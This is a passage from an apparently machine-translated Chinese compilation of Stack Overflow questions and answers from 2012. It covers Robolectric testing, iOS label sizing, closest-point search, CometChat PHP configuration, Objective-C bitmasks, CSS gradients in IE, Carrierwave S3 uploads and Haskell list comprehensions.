    at com.xtremelabs.robolectric.RobolectricTestRunner$1.evaluate(RobolectricTestRunner.java:288)
    at org.junit.runners.BlockJUnit4ClassRunner.runNotIgnored(BlockJUnit4ClassRunner.java:79)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:71)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:49)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:193)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:52)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:191)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:42)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:184)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:236)
    at org.junit.runner.JUnitCore.run(JUnitCore.java:157)
    at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:76)
    at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:195)
    at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:63)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120) 
```

我的活动确实`setContentView`先调用，然后再调用`findViewById`。

奇怪的是，无论我在影子实现中做`setContentView`什么，似乎都没有发生任何事情（例如，抛出 a `NullPojnterException`）。我的影子确实被注册了，就好像我试图覆盖的实现`onCreate`并在那里抛出异常一样，它确实有效。

我在这里想念什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:34:07.347

显然将 Intellij 项目设置中的 Java SDK 更改为 Oracle 而不是 OpenJDK 为我解决了这个问题。

# objective-c - NSString sizeWithFont:constrainedToSize:lineBreakMode: 与实际标签高度不同

> ID：13217515
> 
> 赞同：2
> 
> 时间：2012-11-04T09:41:52.357
> 
> 标签：objective-c, ios, string, uitableview, height

所以这里是怎么回事：我正在实现一个 UITableView （分组样式，有 1 个部分），以标准 UITableViewCells （样式 - UITableViewCellStyleSubtitle）作为内容。我的 textLabel.text 可能很长，这就是我在 TableView:cellForRowAtIndexPath 中设置一些参数的原因：

```
cell.textLabel.lineBreakMode = UILineBreakModeWordWrap;
cell.textLabel.numberOfLines = 0;
cell.textLabel.font = [UIFont boldSystemFontOfSize:CELL_FONT_SIZE];
cell.detailTextLabel.lineBreakMode = UILineBreakModeWordWrap;
cell.detailTextLabel.numberOfLines = 0;
[self configureCell:cell atIndexPath:indexPath]; 
```

为了调整单元格高度，我实现了 tableView:heightForRowAtIndexPath: 如下：

```
Test *test = (Test *)[self.frc objectAtIndexPath:indexPath];
NSString *cellText = test.test_name;

UIFont *cellFont = [UIFont boldSystemFontOfSize:CELL_FONT_SIZE];

CGFloat horizontalConstraint;
if (self.bagdePresent)
{
    // there will be big badge!
    horizontalConstraint = 250.0f;
} else
{
    // there will NO badge
    horizontalConstraint = 280.0f;
}

CGSize constraintSize = CGSizeMake(horizontalConstraint, MAXFLOAT);
CGSize labelSize = [cellText sizeWithFont:cellFont constrainedToSize:constraintSize lineBreakMode:UILineBreakModeWordWrap];

// return label height, 20 as gap, 30 for rating image,
return labelSize.height + 20 + 30; 
```

首先我检查单元格中是否会有徽章图像，如果有，我会减少可用的水平空间。

这就是问题（最后）：对于某些字符串（某些字符串长度） sizeWithFont:constrainedToSize:lineBreakMode: 当我将其文本属性设置为相同的字符串时，返回的值小于实际单元格的 textLabel 高度。结果，如果单元格的 textLabels 大于单元格的边界。当我从显示错误的字符串中添加\删除一些单词时， sizeWithFont:constrainedToSize:lineBreakMode: 会给出精确的高度，稍后用 textLabel 实际高度确认。

我认为这可能是字体的问题，但正如您所看到的字体是相同的。从这里挖到哪里？;)

**UPD1：** 这是一个 textLabel 比在 heightForRowAtIndexPath 中计算的高的示例： ![高文本标签](../Images/b72106624235f5d4cc19675d1f9f359c.png)

![文本较长的普通 textLabel](../Images/312ee8702aaf8020583626de7e97af0c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T11:12:48.473

我建议利用`sizeToFit`. 首先，您将标签的宽度设置为您的`horizontalConstraint`，然后调用`[cell.textLabel sizeToFit]`（这将调整标签的高度以适应其内容，但保持设置的宽度（几乎 - 这意味着它可能会变得更窄）：

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    CGFloat horizontalConstraint;
    if (self.bagdePresent)
    {
        // there will be big badge!
        horizontalConstraint = 250.0f;
    } else
    {
        // there will NO badge
        horizontalConstraint = 280.0f;
    }

    Test *test = (Test *)[self.frc objectAtIndexPath:indexPath];
    NSString *cellText = test.test_name;

    UILabel *label = [[UILabel alloc] initWithFrame:CGRectZero];
    label.text = test.test_name;
    UIFont *cellFont = [UIFont boldSystemFontOfSize:CELL_FONT_SIZE];           
    label.lineBreakMode = UILineBreakModeWordWrap;
    label.numberOfLines = 0;
    label.font = cellFont;

    CGRect frame = label.frame;
    frame.size.width = horizontalConstraint;
    label.frame = frame;
    [label sizeToFit];

    CGSize labelSize = label.frame.size;

    // return label height, 20 as gap, 30 for rating image,
    return labelSize.height + 20 + 30;
} 
```

# java - 在两组中找到一对最近点的智能和快速方法是什么？

> ID：13217520
> 
> 赞同：4
> 
> 时间：2012-11-04T09:43:17.097
> 
> 标签：java, algorithm, geometry, point

例如，我有两个点列表：

```
List<Point2D> a;
List<Point2D> b; 
```

`i`找到这样的和的最好方法是什么`j`，所以这`a.get(i).distance(b.get(j))`是最小的？

显而易见的解决方案是蛮力 - 计算从 in`a`每个点到 in 每个点的`b`距离，保持距离最短的对。但是这个算法是`O(n^2)`，这是不好的。有更好的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T09:51:49.650

您可以将其中一个列表放在[四叉树](http://en.wikipedia.org/wiki/Quadtree)或其他一些空间索引中，以使每次查找快速。

作为替代方案，您可以将所有数据放入具有空间索引功能的数据库中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T09:54:32.303

对于列表的每个点，`a`您都可以从列表中找到最近的点，`b`如[本答案](https://stackoverflow.com/a/13000634/1009831)中所述。时间复杂度为 O((M+N) log M)。N = |A|，M = |B|。

然后你只需搜索 中的点`a`，有最近的邻居。时间复杂度为 O(N)。

# php - 如何在独立网站上集成彗星聊天

> ID：13217522
> 
> 赞同：2
> 
> 时间：2012-11-04T09:43:37.800
> 
> 标签：php, database, configuration, chat, comet

我已经在我的网站上安装了彗星聊天现在的问题是我不知道如何配置我的数据库以匹配这个值，如果有人知道如何为彗星聊天配置自定义 php 站点，这将是一个很大的帮助，或者只是帮助我阅读了脚本以正确配置我的数据库

```
define('DB_SERVER','localhost');
define('DB_PORT','3306');
define('DB_USERNAME','xxx_admin');
define('DB_PASSWORD','xxx');
define('DB_NAME','xxx_database');
define('TABLE_PREFIX','');
define('DB_USERTABLE',              'users');
define('DB_USERTABLE_NAME',         'chat_user');
define('DB_USERTABLE_USERID',       'cometchat_user');
define('DB_USERTABLE_LASTACTIVITY', 'lastactivity');

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* FUNCTIONS */

function getUserID() {
    $userid = 0; // Return 0 if user is not logged in

    if (!empty($_SESSION['userid'])) {
        $userid = $_SESSION['userid'];
    }

    return $userid;
}

function getFriendsList($userid,$time) {
    $sql = ("select DISTINCT ".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." userid, 
".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_NAME." username, 
".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_LASTACTIVITY." lastactivity, 
".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." avatar, ".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." link, 
cometchat_status.message, cometchat_status.status 
from ".TABLE_PREFIX."friends join ".TABLE_PREFIX.DB_USERTABLE." 
on  ".TABLE_PREFIX."friends.toid = ".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." 
left join cometchat_status on ".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." = cometchat_status.userid 
where ".TABLE_PREFIX."friends.fromid = '".mysql_real_escape_string($userid)."' 
order by username asc");
    return $sql;
}

function getUserDetails($userid) {
    $sql = ("select ".TABLE_PREFIX.DB_USERTABLE.".".DB_USERTABLE_USERID." userid, ".TABLE_PREFIX."users.".DB_USERTABLE_NAME." username, ".TABLE_PREFIX."users.".DB_USERTABLE_LASTACTIVITY." lastactivity,  ".TABLE_PREFIX.DB_USERTABLE.".username link, (select storage_path from ".TABLE_PREFIX."storage_files where parent_file_id is null and file_id = ".TABLE_PREFIX.DB_USERTABLE.".photo_id) avatar, cometchat_status.message, cometchat_status.status from ".TABLE_PREFIX."users left join cometchat_status on ".TABLE_PREFIX."users.user_id = cometchat_status.userid where ".TABLE_PREFIX."users.user_id = '".mysql_real_escape_string($userid)."'");
    return $sql;
}

function updateLastActivity($userid) {
    $sql = ("update `".TABLE_PREFIX.DB_USERTABLE."` set ".DB_USERTABLE_LASTACTIVITY." = '".getTimeStamp()."' where ".DB_USERTABLE_USERID." = '".mysql_real_escape_string($userid)."'");
    return $sql;
}

function getUserStatus($userid) {
     $sql = ("select ".TABLE_PREFIX."users.status message, cometchat_status.status from ".TABLE_PREFIX."users left join cometchat_status on ".TABLE_PREFIX."users.user_id = cometchat_status.userid where ".TABLE_PREFIX."users.user_id = '".mysql_real_escape_string($userid)."'");
     return $sql;
}

function getLink($link) {
    return BASE_URL."../profile/".$link;
}

function getAvatar($image) {
    if (is_file(dirname(dirname(__FILE__))."/".$image)) {
        return BASE_URL."../".$image;
    } else {
        return BASE_URL."../application/modules/User/externals/images/nophoto_user_thumb_icon.png";
    }
}

function getTimeStamp() {
    return time();
}

function processTime($time) {
    return $time;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* HOOKS */

function hooks_statusupdate($userid,$statusmessage) {
    $sql = ("update ".TABLE_PREFIX."users set status = '".mysql_real_escape_string($statusmessage)."', status_date = '".date("Y-m-d H:i:s",getTimeStamp())."' where user_id = '".mysql_real_escape_string($userid)."'");
    $query = mysql_query($sql);
}

function hooks_forcefriends() {

}

function hooks_activityupdate($userid,$status) {

}

function hooks_message($userid,$unsanitizedmessage) {

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-07T00:42:35.123

我认为你可以这样做：

确保您已经创建了包含字段 chat_user 和 cometchat_user 的 users 表，当参与者登录您的系统时，您将需要在此表上执行插入，只需传递值并将此插入的 id 保存在变量 $_SESSION['userid']。

希望能帮助到你...

# ios - typedef NS_OPTIONS 检查类似于 UIViewAutoresizing

> ID：13217542
> 
> 赞同：20
> 
> 时间：2012-11-04T09:47:50.340
> 
> 标签：ios, typedef

*简要介绍我想用这个实现什么：*
我有一个自定义`UIView`，我想让箭头可见，例如在底部和左侧。我认为可以像这样做一样做到这`UIViewAutoresizing`一点。

`typedef`所以我为我的自定义视图创建了一个类似的：

```
typedef NS_OPTIONS(NSUInteger, Arrows) {
    ArrowNone      = 0,
    ArrowRight     = 1 << 0,
    ArrowBottom    = 1 << 1,
    ArrowLeft      = 1 << 2,
    ArrowTop       = 1 << 3
}; 
```

同样在我的自定义视图头文件中，我添加了：

```
@property (nonatomic) Arrows arrows; 
```

这一切都有效，现在我可以设置属性：
`customview.arrows = (ArrowBottom | ArrowLeft);`

这返回`6`。

现在是我的问题，如何检查我的`arrows`属性是否包含底部和左侧？我试过了：

```
if (self.arrows == ArrowLeft) {
    NSLog(@"Show arrow left");
} 
```

这没有做任何事情。还有其他方法可以检查吗？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-12-11T11:43:46.257

检查位掩码的正确方法是使用 AND (&) 运算符对值进行解码，如下所示：

```
Arrows a = (ArrowLeft | ArrowRight);    
if (a & ArrowBottom) {
   NSLog(@"arrow bottom code here");    
}

if (a & ArrowLeft) {
   NSLog(@"arrow left code here");    
}    

if (a & ArrowRight) {
   NSLog(@"arrow right code here");    
}

if (a & ArrowTop) {
   NSLog(@"arrow top code here");    
} 
```

这将在控制台中打印出来：

```
arrow left code here
arrow right code here 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-07-25T21:22:56.690

要进行复合检查，您可以使用以下代码：

```
if ((a & ArrowRight) && (a & ArrowTop)) {
       NSLog(@"arrow right and top code here");    
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-04-27T00:47:49.913

检查此值的正确方法是先将这些值按位与，然后检查是否与所需值相等。

```
Arrows a = (ArrowBottom | ArrowLeft);    
if (((a & ArrowBottom) == ArrowBottom) && ((a & ArrowLeft) == ArrowLeft)) {
    // arrow bottom-left
} 
```

以下参考资料解释了为什么这是正确的，并提供了对枚举类型的其他见解。

参考：[检查位掩码中的值](http://sam.dods.co/blog/2014/02/01/checking-for-a-value-in-a-bit-mask/)

# css - 带有切角的框在 IE 上不起作用

> ID：13217543
> 
> 赞同：0
> 
> 时间：2012-11-04T09:48:44.227
> 
> 标签：css

我正在使用 CSS3，并且正在创建一个带有切角的盒子。

这是代码：

```
.boxcornerscutted {
background: #ffffff;
background:
    -moz-linear-gradient(45deg,  transparent 10px, #ffffff 10px),
    -moz-linear-gradient(135deg, transparent 10px, #ffffff 10px),
    -moz-linear-gradient(225deg, transparent 10px, #ffffff 10px),
    -moz-linear-gradient(315deg, transparent 10px, #ffffff 10px);
background:
    -o-linear-gradient(45deg,  transparent 10px, #ffffff 10px),
    -o-linear-gradient(135deg, transparent 10px, #ffffff 10px),
    -o-linear-gradient(225deg, transparent 10px, #ffffff 10px),
    -o-linear-gradient(315deg, transparent 10px, #ffffff 10px);
background:
    -webkit-linear-gradient(45deg,  transparent 10px, #ffffff 10px),
    -webkit-linear-gradient(135deg, transparent 10px, #ffffff 10px),
    -webkit-linear-gradient(225deg, transparent 10px, #ffffff 10px),
    -webkit-linear-gradient(315deg, transparent 10px, #ffffff 10px);

padding:9px 9px;
margin-top: -30px;
margin-bottom: -15px;
}

div.boxcornerscutted {
    background-position: bottom left, bottom right, top right, top left;
    -moz-background-size: 50% 50%;
    -webkit-background-size: 50% 50%;
     background-size: 50% 50%;
     background-repeat: no-repeat;
} 
```

它在 Chrome、Opera、Safari、Mozilla 上完美运行，但在 IE 上（显然）有问题。任何提示如何在 IE 上重新创建相同（或类似效果）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:08:57.170

渐变不适用于 IE 6/7/8/9。尝试使用[http://css3pie.com/](http://css3pie.com/)

**CSS3 PIE**使 Internet Explorer 6-9 能够呈现几个最有用的 CSS3 装饰功能。

查看渐变模式和代码示例的演示，[http://css3pie.com/demos/gradient-patterns/](http://css3pie.com/demos/gradient-patterns/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:12:41.157

它可以使用 JavaScript 和[jQuery corner](http://malsup.com/jquery/corner/)来实现，但不能使用纯 CSS。

这`-ms-linear-gradient`是最接近 IE 等价物的东西，但它仅受 IE10 支持。

早期的 IE 版本支持使用`filter:progid:DXImageTransform.Microsoft.gradient( ... );`和的简单渐变`filter:ms-linear-gradient( ... );`，但不支持这种渐变。

# ruby-on-rails-3 - 雾 S3 上传导致

> ID：13217544
> 
> 赞同：3
> 
> 时间：2012-11-04T09:49:01.257
> 
> 标签：ruby-on-rails-3, heroku, amazon-s3, carrierwave, fog

我正在开发一个平台，允许商家上传他们商店的图片。为此，我正在使用 Carrierwave+fog。由于该应用程序托管在 heroku 上，因此图片需要存储在 amazon s3 上。

在我的本地机器上，如果存储是本地的，一切正常，但是一旦雾处理上传，事情就会出错。

我将首先发布本地存储版本（工作正常），然后发布我当前启用雾的 s3 版本以及我得到的错误。

本地存储版本（工作正常）：

```
# app/uploaders/picture_uploader.rb
class PictureUploader < CarrierWave::Uploader::Base
  storage :file
  def store_dir
    "uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{model.id}"
  end
end 
```

启用雾的 s3 版本（不起作用）：

```
# app/uploaders/picture_uploader.rb
class PictureUploader < CarrierWave::Uploader::Base
  storage :fog
  def store_dir
    "uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{model.id}"
  end
end

# config/initializers/fog.rb
CarrierWave.configure do |config|
  config.fog_credentials = {
    :provider               => 'AWS',       # required
    :aws_access_key_id      => 'xxxx',       # required
    :aws_secret_access_key  => 'xxxx'       # required
  }
  config.fog_directory  = 'yyyy'                     # required
  config.fog_public     = true                          # optional, defaults to true
end 
```

当我现在创建或编辑新商店时，图片实际上已经成功上传到s3，但是rails给出了Permission denied错误消息（app/tmp/carrierwave/20121104-0929-5512-8270/04.png无法访问） .

完整的错误信息：

```
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:1406:in `unlink'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:1406:in `block in remove_file'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:1414:in `platform_support'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:1405:in `remove_file'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:785:in `remove_file'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:563:in `block in rm'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:562:in `each'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/fileutils.rb:562:in `rm'
carrierwave (0.5.8) lib/carrierwave/sanitized_file.rb:217:in `delete'
carrierwave (0.5.8) lib/carrierwave/uploader/store.rb:60:in `block in store!'
carrierwave (0.5.8) lib/carrierwave/uploader/callbacks.rb:17:in `with_callbacks'
carrierwave (0.5.8) lib/carrierwave/uploader/store.rb:58:in `store!'
carrierwave (0.5.8) lib/carrierwave/mount.rb:347:in `store!'
carrierwave (0.5.8) lib/carrierwave/mount.rb:217:in `store_bild!'
activesupport (3.1.0) lib/active_support/callbacks.rb:401:in `_run_save_callbacks'
activesupport (3.1.0) lib/active_support/callbacks.rb:81:in `run_callbacks'
activerecord (3.1.0) lib/active_record/callbacks.rb:264:in `create_or_update'
activerecord (3.1.0) lib/active_record/persistence.rb:37:in `save'
activerecord (3.1.0) lib/active_record/validations.rb:50:in `save'
activerecord (3.1.0) lib/active_record/attribute_methods/dirty.rb:22:in `save'
activerecord (3.1.0) lib/active_record/transactions.rb:241:in `block (2 levels) in save'
activerecord (3.1.0) lib/active_record/transactions.rb:295:in `block in with_transaction_returning_status'
activerecord (3.1.0) lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'
activerecord (3.1.0) lib/active_record/transactions.rb:208:in `transaction'
activerecord (3.1.0) lib/active_record/transactions.rb:293:in `with_transaction_returning_status'
activerecord (3.1.0) lib/active_record/transactions.rb:241:in `block in save'
activerecord (3.1.0) lib/active_record/transactions.rb:252:in `rollback_active_record_state!'
activerecord (3.1.0) lib/active_record/transactions.rb:240:in `save'
activerecord (3.1.0) lib/active_record/persistence.rb:163:in `block in update_attributes'
activerecord (3.1.0) lib/active_record/transactions.rb:295:in `block in with_transaction_returning_status'
activerecord (3.1.0) lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'
activerecord (3.1.0) lib/active_record/transactions.rb:208:in `transaction'
activerecord (3.1.0) lib/active_record/transactions.rb:293:in `with_transaction_returning_status'
activerecord (3.1.0) lib/active_record/persistence.rb:161:in `update_attributes'
app/controllers/stores_controller.rb:62:in `block in update'
actionpack (3.1.0) lib/action_controller/metal/mime_responds.rb:269:in `call'
actionpack (3.1.0) lib/action_controller/metal/mime_responds.rb:269:in `retrieve_response_from_mimes'
actionpack (3.1.0) lib/action_controller/metal/mime_responds.rb:194:in `respond_to'
app/controllers/stores_controller.rb:61:in `update'
actionpack (3.1.0) lib/action_controller/metal/implicit_render.rb:4:in `send_action'
actionpack (3.1.0) lib/abstract_controller/base.rb:167:in `process_action'
actionpack (3.1.0) lib/action_controller/metal/rendering.rb:10:in `process_action'
actionpack (3.1.0) lib/abstract_controller/callbacks.rb:18:in `block in process_action'
activesupport (3.1.0) lib/active_support/callbacks.rb:416:in `_run__16358980__process_action__192134115__callbacks'
activesupport (3.1.0) lib/active_support/callbacks.rb:386:in `_run_process_action_callbacks'
activesupport (3.1.0) lib/active_support/callbacks.rb:81:in `run_callbacks'
actionpack (3.1.0) lib/abstract_controller/callbacks.rb:17:in `process_action'
actionpack (3.1.0) lib/action_controller/metal/rescue.rb:17:in `process_action'
actionpack (3.1.0) lib/action_controller/metal/instrumentation.rb:30:in `block in process_action'
activesupport (3.1.0) lib/active_support/notifications.rb:53:in `block in instrument'
activesupport (3.1.0) lib/active_support/notifications/instrumenter.rb:21:in `instrument'
activesupport (3.1.0) lib/active_support/notifications.rb:53:in `instrument'
actionpack (3.1.0) lib/action_controller/metal/instrumentation.rb:29:in `process_action'
actionpack (3.1.0) lib/action_controller/metal/params_wrapper.rb:201:in `process_action'
activerecord (3.1.0) lib/active_record/railties/controller_runtime.rb:18:in `process_action'
actionpack (3.1.0) lib/abstract_controller/base.rb:121:in `process'
actionpack (3.1.0) lib/abstract_controller/rendering.rb:45:in `process'
actionpack (3.1.0) lib/action_controller/metal.rb:193:in `dispatch'
actionpack (3.1.0) lib/action_controller/metal/rack_delegation.rb:14:in `dispatch'
actionpack (3.1.0) lib/action_controller/metal.rb:236:in `block in action'
actionpack (3.1.0) lib/action_dispatch/routing/route_set.rb:65:in `call'
actionpack (3.1.0) lib/action_dispatch/routing/route_set.rb:65:in `dispatch'
actionpack (3.1.0) lib/action_dispatch/routing/route_set.rb:29:in `call'
rack-mount (0.8.3) lib/rack/mount/route_set.rb:152:in `block in call'
rack-mount (0.8.3) lib/rack/mount/code_generation.rb:96:in `block in recognize'
rack-mount (0.8.3) lib/rack/mount/code_generation.rb:75:in `optimized_each'
rack-mount (0.8.3) lib/rack/mount/code_generation.rb:95:in `recognize'
rack-mount (0.8.3) lib/rack/mount/route_set.rb:141:in `call'
actionpack (3.1.0) lib/action_dispatch/routing/route_set.rb:531:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/best_standards_support.rb:17:in `call'
rack (1.3.6) lib/rack/etag.rb:23:in `call'
rack (1.3.6) lib/rack/conditionalget.rb:35:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/head.rb:14:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/params_parser.rb:21:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/flash.rb:243:in `call'
rack (1.3.6) lib/rack/session/abstract/id.rb:195:in `context'
rack (1.3.6) lib/rack/session/abstract/id.rb:190:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/cookies.rb:326:in `call'
activerecord (3.1.0) lib/active_record/query_cache.rb:62:in `call'
activerecord (3.1.0) lib/active_record/connection_adapters/abstract/connection_pool.rb:477:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/callbacks.rb:29:in `block in call'
activesupport (3.1.0) lib/active_support/callbacks.rb:392:in `_run_call_callbacks'
activesupport (3.1.0) lib/active_support/callbacks.rb:81:in `run_callbacks'
actionpack (3.1.0) lib/action_dispatch/middleware/callbacks.rb:28:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/reloader.rb:68:in `call'
rack (1.3.6) lib/rack/sendfile.rb:101:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/remote_ip.rb:48:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/show_exceptions.rb:47:in `call'
railties (3.1.0) lib/rails/rack/logger.rb:13:in `call'
rack (1.3.6) lib/rack/methodoverride.rb:24:in `call'
rack (1.3.6) lib/rack/runtime.rb:17:in `call'
activesupport (3.1.0) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
rack (1.3.6) lib/rack/lock.rb:15:in `call'
actionpack (3.1.0) lib/action_dispatch/middleware/static.rb:53:in `call'
railties (3.1.0) lib/rails/engine.rb:455:in `call'
railties (3.1.0) lib/rails/rack/content_length.rb:16:in `call'
railties (3.1.0) lib/rails/rack/log_tailer.rb:14:in `call'
rack (1.3.6) lib/rack/handler/webrick.rb:59:in `service'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/httpserver.rb:138:in `service'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/httpserver.rb:94:in `run'
C:/RailsInstaller/Ruby1.9.3/lib/ruby/1.9.1/webrick/server.rb:191:in `block in start_thread' 
```

这个错误让我很困惑，因为直接在浏览器中输入 app/tmp/carrierwave/20121104-0929-5512-8270/04.png 可以正常工作。

为了完整起见，这里是控制器和模型（两个版本相同）

```
#stores_controller.rb
def create
  @store = Store.new(params[:store])

  respond_to do |format|
    if @store.save
      format.html { redirect_to @store, notice: 'Store was successfully created.' }
      format.json { render json: @store, status: :created, location: @store }
    else
      format.html { render action: "new" }
      format.json { render json: @store.errors, status: :unprocessable_entity }
    end
  end
end

#models/store.rb
class Store < ActiveRecord::Base
  mount_uploader :bild, PictureUploader
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T00:29:45.270

尝试将 cache_dir 添加到您的上传器：

```
 def cache_dir
    "#{Rails.root}/tmp/uploads"
  end

  # Override the directory where uploaded files will be stored.
  # This is a sensible default for uploaders that are meant to be mounted:
  def store_dir
    "uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{model.id}"
  end 
```

此外，您可能需要添加 config/initializers/carrierwave.rb：

```
CarrierWave.configure do |config|
    # hack fix for windows machine due to tmp file permission error
    # per https://github.com/jnicklas/carrierwave/issues/220/
    if ENV['RAILS_ENV'] != 'production'
      config.delete_tmp_file_after_storage = false  
    end
    config.fog_credentials = {
      :provider               => 'AWS',       # required
      :aws_access_key_id      => ENV['MF_S3_KEY'],       # required
      :aws_secret_access_key  => ENV['MF_S3_SECRET'],       # required
      :region                 => 'us-east-1'  # optional, defaults to 'us-east-1'
    }
    config.fog_directory  = ENV['MF_FLYER_BUCKET']                     # required
    #config.fog_host       = 'https://assets.example.com'            # optional, defaults to nil
    #config.fog_public     = false                                   # optional, defaults to true
    #config.fog_attributes = {'Cache-Control'=>'max-age=315576000'}  # optional, defaults to {} 
```

# list - Haskell - 如果否则返回干净的元组

> ID：13217546
> 
> 赞同：5
> 
> 时间：2012-11-04T09:49:15.773
> 
> 标签：list, haskell, tuples

我的作业任务是如果第一个元组的第二个元素与第二个元组的第一个元素相同，则将两个元组分组到一个列表中。然后，如果第一个元组是`(a, b)`，第二个是`(b, c)`，则`(a, c)`必须将元组添加到结果列表中。

我写了第一个函数，它使用一个元组获取元素，第二个列表包含许多元组，并将每个元素进行比较。

这个工作正常：

```
c1 = ("a","x")
d1 = [ ("x","b"), ("z","c"), ("x","b"), ("z","c")
     , ("x","b"), ("z","c"), ("x","b"), ("z","c") ]

getByOne c1 a1 = filter (/=[])
  [ if (fst  (last(take n a1))) == (snd c1)
    then [((fst c1),  (snd  (last(take n a1))))]
    else  [] | n <- [1..(length a1) ] ] 
```

输出：

```
[ [("a","b")], [("a","b")], [("a","b")], [("a","b")] ] 
```

但问题是我不能将 if then 和 else 语句只放入简单的元组，所以我创建了一个新列表。在这个“解决方法”的最后，我得到了列表中的列表等等。此外，如果输出列表更大，列表中的列表也会更多。

有没有办法只传递元组或空元组，或者我应该以某种方式对这些列表进行分组？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-04T10:16:44.870

您可以使用扁平化结果

```
concat :: [[a]] -> [a] 
```

那么你甚至不需要`filter (/=[])`- 顺便说一句，条件`(/= [])`写得更惯用`not . null`，因为`null`测试不会`Eq`对其参数施加约束（你在这里已经有一个约束，所以这只是一个习语问题）。

此外，`last (take n a1)`只是if的`n`第 - 个元素。由于您施加了该限制，因此可以更简洁地表示为`a1``1 <= n <= length a1``a1 !! (n-1)`

然后你在结构上

```
getByOne c1 a1 = concat $ [something c1 (a1 !! i) | i <- [0 .. length a1 - 1]] 
```

（我已将索引转换为 index by `i`），它更清晰、更有效地表示为

```
getByOne c1 a1 = concat $ map (something c1) a1 
```

如果您更喜欢列表推导`map`，也可以将其写为

```
getByOne c1 a1 = concat [something c1 x | x <- a1] 
```

在您的情况下，使用 alist-comprehension 生成器中的模式匹配能力，给了我们

```
getByOne (f,s) a1 = concat [ if a == s then [(f,b)] else [] | (a,b) <- a1] 
```

它更短且更具可读性。而不是使用`if condition then [element] else []`and `concat`，更好的是在列表理解中使用条件，

```
getByOne (f,s) list = [(f,b) | (a,b) <- list, a == s] 
```

这是简短而清晰的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T10:24:40.480

1.  `[1..(length a1)]`可以写`[1 .. length a1]`
2.  ```
    [ if (fst  (last(take n a1))) == (snd c1)
      then [((fst c1),  (snd  (last(take n a1))))]
      else  [] | n <- [1..(length a1) ] ] 
    ```

    可以写

    ```
    [ if fst lastElement == snd c1
      then [(fst c1, snd lastElement)]
      else [] | n <- [1 .. length a1 ]
              , let lastElement = last (take n a1) ] 
    ```

3.  然后，不要使用列表索引来遍历它，而是直接使用列表：

    ```
    [ if x == snd c1
      then [(fst c1, y)]
      else [] | (x, y) <- a1 ] 
    ```

4.  然后，不要使用列表来表示解决方案的存在与否，而是使用`Maybe`：

    ```
    import Data.Maybe

